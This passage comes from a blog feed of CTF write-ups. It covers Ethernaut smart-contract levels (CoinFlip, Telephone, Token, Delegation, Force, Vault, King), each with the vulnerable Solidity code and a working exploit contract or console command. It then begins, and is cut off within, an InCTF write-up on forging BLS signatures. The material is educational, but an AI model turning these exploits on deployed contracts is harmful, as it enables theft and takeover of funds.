class="line"></span><br><span class="line">  uint256 public consecutiveWins;</span><br><span class="line">  uint256 lastHash;</span><br><span class="line">  uint256 <span class="variable constant_">FACTOR</span> = <span class="number">57896044618658097711785492504343953926634992332820282019728792003956564819968</span>;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">    consecutiveWins = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">flip</span>(<span class="params">bool _guess</span>) public returns (bool) &#123;</span><br><span class="line">    uint256 blockValue = <span class="title function_">uint256</span>(<span class="title function_">blockhash</span>(block.<span class="property">number</span> - <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (lastHash == blockValue) &#123;</span><br><span class="line">      <span class="title function_">revert</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lastHash = blockValue;</span><br><span class="line">    uint256 coinFlip = blockValue / <span class="variable constant_">FACTOR</span>;</span><br><span class="line">    bool side = coinFlip == <span class="number">1</span> ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (side == _guess) &#123;</span><br><span class="line">      consecutiveWins++;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      consecutiveWins = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Here the <code>consecutiveWins</code> variable is set to 0 in the begin and we have to make it 10 to win this challenge. to do that we need to guess the CoinFlip correctly for 10 times, this is possible since the contract is generating the random number form itâ€™s blockhash of previous block since we all can get the value of the random number, we can calculate the CoinFlip and give it as a guess for 10 time to win this challenge.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">CoinFlip</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">flip</span>(<span class="params">bool _guess</span>) external returns (bool);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Exploit</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="title class_">CoinFlip</span> cf;</span><br><span class="line">  uint256 lastHash;</span><br><span class="line">  uint256 <span class="variable constant_">FACTOR</span> = <span class="number">57896044618658097711785492504343953926634992332820282019728792003956564819968</span>;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">address _address</span>) &#123;</span><br><span class="line">      cf = <span class="title class_">CoinFlip</span>(_address);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">guess</span>(<span class="params"></span>) public returns (bool) &#123;</span><br><span class="line">    uint256 blockValue = <span class="title function_">uint256</span>(<span class="title function_">blockhash</span>(block.<span class="property">number</span> - <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (lastHash == blockValue) &#123;</span><br><span class="line">      <span class="title function_">revert</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lastHash = blockValue;</span><br><span class="line">    uint256 coinFlip = blockValue / <span class="variable constant_">FACTOR</span>;</span><br><span class="line">    bool side = coinFlip == <span class="number">1</span> ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">require</span>(cf.<span class="title function_">flip</span>(side));</span><br><span class="line">    <span class="keyword">return</span> side;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="4-Telephone"><a href="#4-Telephone" class="headerlink" title="4 - Telephone"></a>4 - Telephone</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Telephone</span> &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">    owner = msg.<span class="property">sender</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">changeOwner</span>(<span class="params">address _owner</span>) public &#123;</span><br><span class="line">    <span class="keyword">if</span> (tx.<span class="property">origin</span> != msg.<span class="property">sender</span>) &#123;</span><br><span class="line">      owner = _owner;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The goal of this challenge is to become owner using the <code>changeOwner()</code> funciton but there is a check says <code>tx.origin != msg.sender</code> which means the origner of the transaction should not be the same address as the msg.sender, this is possible if we use a smart contract to call the <code>Telephone</code> contract to change the owner.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">Telephone</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">changeOwner</span>(<span class="params">address _owner</span>) external;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Exploit</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="title class_">Telephone</span> cf;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">address _address</span>) &#123;</span><br><span class="line">      cf = <span class="title class_">Telephone</span>(_address);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">call_the_phone</span>(<span class="params"></span>) public &#123;</span><br><span class="line">      cf.<span class="title function_">changeOwner</span>(msg.<span class="property">sender</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="5-Token"><a href="#5-Token" class="headerlink" title="5 - Token"></a>5 - Token</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Token</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">mapping</span>(<span class="function"><span class="params">address</span> =&gt;</span> uint) balances;</span><br><span class="line">  uint public totalSupply;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">uint _initialSupply</span>) public &#123;</span><br><span class="line">    balances[msg.<span class="property">sender</span>] = totalSupply = _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">transfer</span>(<span class="params">address _to, uint _value</span>) public returns (bool) &#123;</span><br><span class="line">    <span class="built_in">require</span>(balances[msg.<span class="property">sender</span>] - _value &gt;= <span class="number">0</span>);</span><br><span class="line">    balances[msg.<span class="property">sender</span>] -= _value;</span><br><span class="line">    balances[_to] += _value;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">balanceOf</span>(<span class="params">address _owner</span>) public view returns (uint balance) &#123;</span><br><span class="line">    <span class="keyword">return</span> balances[_owner];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>In this challenge we are given 20 tokens and that is the <code>toatalSupply</code> which means only 20 tokens are in existance, but somehow we need to get more tokens into our account to win this challenge. since this contract is not using <code>SafeMath</code> library integer <strong>overflow</strong> and <strong>underflow</strong> is possible, simply by transfering <code>21 tokens</code> to some other address makes the contract to subtract 21 tokens from our accout. since our balance is 20 and subtracting 21 make the value <code>(-1) % 2**256</code> which is greater than <code>0</code> and passes the requirement of the <code>transaction()</code> funciton and increases our balance more than 20.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title function_">transfer</span>(instance,<span class="number">21</span>)</span><br></pre></td></tr></table></figure><hr><h2 id="6-Delegation"><a href="#6-Delegation" class="headerlink" title="6 - Delegation"></a>6 - Delegation</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Delegate</span> &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">address _owner</span>) &#123;</span><br><span class="line">    owner = _owner;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">pwn</span>(<span class="params"></span>) public &#123;</span><br><span class="line">    owner = msg.<span class="property">sender</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Delegation</span> &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line">  <span class="title class_">Delegate</span> delegate;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">address _delegateAddress</span>) &#123;</span><br><span class="line">    delegate = <span class="title class_">Delegate</span>(_delegateAddress);</span><br><span class="line">    owner = msg.<span class="property">sender</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">fallback</span>() external &#123;</span><br><span class="line">    (bool result,) = <span class="title function_">address</span>(delegate).<span class="title function_">delegatecall</span>(msg.<span class="property">data</span>);</span><br><span class="line">    <span class="keyword">if</span> (result) &#123;</span><br><span class="line">      <span class="variable language_">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>This contractâ€™s <code>fallback()</code> function uses the <code>delegatecall</code> to call the <code>delegate contract</code> with the data that we sent, so in simple words <strong>we can execute any function in the <code>delegate</code> contract with context of <code>delegation</code> contract</strong>, here the context also includes storage of the contract that means if we change the variable in <code>delegate</code> contract using the <code>delegatecall</code> from <code>delegation</code> contract the result of change is done in the <code>delegation</code> contract. so, executing the <code>pwn()</code> function through the <code>delegatecall</code> from <code>delegation</code> contract makes us the owner of the <code>delegation</code> contract achieving our goal.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> <span class="title function_">sendTransaction</span>(&#123;<span class="attr">from</span>: player, <span class="attr">to</span>: instance, <span class="attr">data</span>: <span class="string">&quot;0xdd365b8b&quot;</span>&#125;)</span><br></pre></td></tr></table></figure><hr><h2 id="7-Force"><a href="#7-Force" class="headerlink" title="7 - Force"></a>7 - Force</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Force</span> &#123;<span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">                   MEOW ?</span></span><br><span class="line"><span class="comment">         /\_/\   /</span></span><br><span class="line"><span class="comment">    ____/ o o \</span></span><br><span class="line"><span class="comment">  /~____  =Ã¸= /</span></span><br><span class="line"><span class="comment"> (______)__m_m)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span>&#125;</span><br></pre></td></tr></table></figure><p>The goal of this challenge is to force this contract to accept some ether, it is not possible in the general way since it has no payable function implemented not even <code>fallback</code> or a <code>receive</code> function. but there is a way we can froce this contract to accept funds that is by using <code>sefldestruct</code> function from another contract, that way the contract transfers all of itâ€™s funds to given address no matter what.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Exploit</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">address payable _address</span>) payable &#123;</span><br><span class="line">      <span class="title function_">selfdestruct</span>(_address);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="8-Vault"><a href="#8-Vault" class="headerlink" title="8 - Vault"></a>8 - Vault</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Vault</span> &#123;</span><br><span class="line">  bool public locked;</span><br><span class="line">  bytes32 private password;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">bytes32 _password</span>) &#123;</span><br><span class="line">    locked = <span class="literal">true</span>;</span><br><span class="line">    password = _password;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">unlock</span>(<span class="params">bytes32 _password</span>) public &#123;</span><br><span class="line">    <span class="keyword">if</span> (password == _password) &#123;</span><br><span class="line">      locked = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The goal of this challenge is to find the <code>password</code>and unlock the vault, since the <strong>password is a private variable</strong> contract doesnâ€™t gives us the access, but the one thing we have to remember is this is an decentralised ethereum network and everything in here is in plaintext and not encryted and <strong>anyone can read the data from blockchain database</strong>. so we can simply read the password from the database and unlock the vault to achieve our goal.</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">In [<span class="number">101</span>]: <span class="keyword">from</span> web3.middleware <span class="keyword">import</span> geth_poa_middleware</span><br><span class="line"></span><br><span class="line">In [<span class="number">102</span>]: <span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"></span><br><span class="line">In [<span class="number">103</span>]: url = <span class="string">&#x27;https://sepolia.infura.io/v3/e1881826831143f285a553a9a8f5a308&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">104</span>]: io = Web3(Web3.HTTPProvider(url))</span><br><span class="line"></span><br><span class="line">In [<span class="number">105</span>]: io.middleware_onion.inject(geth_poa_middleware, layer=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">106</span>]: ad = <span class="string">&#x27;0x094C2Afb0eF4711f8DeF82Ab727A19AE4F41C27d&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">107</span>]: io.eth.get_storage_at(ad,<span class="number">0</span>)       <span class="comment"># this slot stores the locked bool</span></span><br><span class="line">Out[<span class="number">107</span>]: HexBytes(<span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000001&#x27;</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">108</span>]: io.eth.get_storage_at(ad,<span class="number">1</span>)       <span class="comment"># this slot stores the password</span></span><br><span class="line">Out[<span class="number">108</span>]: HexBytes(<span class="string">&#x27;0x412076657279207374726f6e67207365637265742070617373776f7264203a29&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title function_">unlock</span>(<span class="string">&#x27;0x412076657279207374726f6e67207365637265742070617373776f7264203a29&#x27;</span>)</span><br></pre></td></tr></table></figure><hr><h2 id="9-King"><a href="#9-King" class="headerlink" title="9 - King"></a>9 - King</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">King</span> &#123;</span><br><span class="line"></span><br><span class="line">  address king;</span><br><span class="line">  uint public prize;</span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) payable &#123;</span><br><span class="line">    owner = msg.<span class="property">sender</span>;  </span><br><span class="line">    king = msg.<span class="property">sender</span>;</span><br><span class="line">    prize = msg.<span class="property">value</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">receive</span>() external payable &#123;</span><br><span class="line">    <span class="built_in">require</span>(msg.<span class="property">value</span> &gt;= prize || msg.<span class="property">sender</span> == owner);</span><br><span class="line">    <span class="title function_">payable</span>(king).<span class="title function_">transfer</span>(msg.<span class="property">value</span>);</span><br><span class="line">    king = msg.<span class="property">sender</span>;</span><br><span class="line">    prize = msg.<span class="property">value</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">_king</span>(<span class="params"></span>) public view returns (address) &#123;</span><br><span class="line">    <span class="keyword">return</span> king;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Anyone who sends more than the <code>prize</code> ammount can become the <code>king</code> of this contract, but our goal is to block everyone from getting king and stay as a perminant king of this contract. to do that we can use the <code>revert</code> function in our contract to block the transfer this contract does when it changes the king. now our cantract is king since it does not receive any ether no one will be able to become the king of this contract.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Exploit</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address payable _address</span>) public payable &#123;</span><br><span class="line">        _address.<span class="property">call</span>&#123;<span class="attr">value</span>: <span class="number">0.001</span> ether&#125;(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="title function_">receive</span>() external payable &#123;</span><br><span class="line">        <span class="title function_">revert</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr>]]></content>
      
      
      
        <tags>
            
            <tag> SmartContract </tag>
            
            <tag> ethernaut </tag>
            
            <tag> ethereum </tag>
            
            <tag> solidity </tag>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Trouble With Pairs - InCTF Internationals 2021</title>
      <link href="/2021/08/16/Trouble-With-Pairs-InCTF-Internationals-2021/"/>
      <url>/2021/08/16/Trouble-With-Pairs-InCTF-Internationals-2021/</url>
      
        <content type="html"><![CDATA[<p>tl;dr</p><ul><li>Get <strong>fake_flag</strong> by using Consensus Attack.</li><li>Get <strong>xored_flag</strong> by forging individual signatures.</li><li>Xor them both to get the <strong>flag</strong>.</li></ul><p><strong>Challenge point</strong>: 925</p><p><strong>No. of solves</strong>: 14</p><p><strong>Challenge Author</strong>: <a href="https://twitter.com/chandu_kona?lang=en">Chandu-Kona</a></p><h2 id="Challenge-Description"><a href="#Challenge-Description" class="headerlink" title="Challenge Description"></a><strong>Challenge Description</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">We are testing a new Optimised Signature scheme for Authentication in our Voting System.</span><br><span class="line">This might lead us to reduce the time taken for Election Process.</span><br></pre></td></tr></table></figure><h2 id="Handout"><a href="#Handout" class="headerlink" title="Handout"></a><strong>Handout</strong></h2><pre><code>-    BLS.py-    signer.py-    server.py</code></pre><h3 id="BLS-py"><a href="#BLS-py" class="headerlink" title="BLS.py"></a>BLS.py</h3><ul><li><code>BLS.py</code> is same file as <code>ciphersuites.py</code> from <a href="https://github.com/ethereum/py_ecc/tree/master/py_ecc/bls">py_ecc</a> module with a function overriden.</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># from py_ecc.bls.hash_to_curve import hash_to_G2</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hash_to_G2</span>(<span class="params">msg, DST, <span class="built_in">hash</span></span>):</span><br><span class="line">    m = <span class="built_in">int</span>(<span class="built_in">hash</span>(msg).hexdigest(),<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span>  multiply(G2,m)</span><br></pre></td></tr></table></figure><h3 id="signer-py"><a href="#signer-py" class="headerlink" title="signer.py"></a>signer.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> BLS <span class="keyword">import</span> G2ProofOfPossession <span class="keyword">as</span> bls</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> data</span><br><span class="line"></span><br><span class="line">result = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    d = &#123;&#125;</span><br><span class="line">    d[<span class="string">&#x27;Name&#x27;</span>] = i[<span class="string">&#x27;Name&#x27;</span>]</span><br><span class="line">    d[<span class="string">&#x27;Vote&#x27;</span>] = i[<span class="string">&#x27;Vote&#x27;</span>]</span><br><span class="line">    d[<span class="string">&#x27;Count&#x27;</span>] = i[<span class="string">&#x27;Count&#x27;</span>]</span><br><span class="line">    d[<span class="string">&#x27;PK&#x27;</span>] = i[<span class="string">&#x27;PK&#x27;</span>].<span class="built_in">hex</span>()</span><br><span class="line">    d[<span class="string">&#x27;Sign&#x27;</span>] = bls.Sign(i[<span class="string">&#x27;PrivKey&#x27;</span>],i[<span class="string">&#x27;Vote&#x27;</span>].encode()).<span class="built_in">hex</span>()</span><br><span class="line">    result.append(d)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(result)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">[&#123;&#x27;Name&#x27;: &#x27;Nebraska&#x27;,</span></span><br><span class="line"><span class="string">  &#x27;Vote&#x27;: &#x27;R&#x27;,</span></span><br><span class="line"><span class="string">  &#x27;Count&#x27;: 5,</span></span><br><span class="line"><span class="string">  &#x27;PK&#x27;: &#x27;aa6fc9c17a1b2de916e5d5453444655e9f6dd3d456b96239f954bc30b80f551c44c1c2423825bc01577e1986098f362b&#x27;,</span></span><br><span class="line"><span class="string">  &#x27;Sign&#x27;: &#x27;a09538da373b317adf63cacb53799417ba57d79486aeec78d7687b37e72625190741313800a7698beb2659b725ca728a074514b4cc1fc300dee2e2ae74516993f6760f0839cc4d712a108c58955e062bf45100966fca0288f39f9bfc8ab25706&#x27;&#125;,</span></span><br><span class="line"><span class="string">  .</span></span><br><span class="line"><span class="string">  .</span></span><br><span class="line"><span class="string">  .</span></span><br><span class="line"><span class="string">  &#123;&#x27;Name&#x27;: &#x27;Michigan&#x27;,</span></span><br><span class="line"><span class="string">  &#x27;Vote&#x27;: &#x27;D&#x27;,</span></span><br><span class="line"><span class="string">  &#x27;Count&#x27;: 16,</span></span><br><span class="line"><span class="string">  &#x27;PK&#x27;: 